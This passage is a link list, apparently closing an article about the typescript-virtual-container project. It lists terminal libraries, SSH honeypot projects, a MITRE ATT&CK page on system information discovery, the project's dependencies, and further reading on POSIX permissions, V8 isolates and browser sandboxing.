- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (archived): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Minimal Node.js SSH honeypot: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Curated list: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- System information discovery (how attackers fingerprint honeypots): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Online demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Architecture guide**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH protocol implementation) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS snapshot compression) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket shell transport) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Further reading

- **POSIX permission model** -- Open Group spec: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (pattern used in VFS persistence) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate model** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA spec** (for TinyEMU/JSLinux context) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 architecture** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, useful contrast with the Wasm approach: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL on the quickjs-emscripten bundle size: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
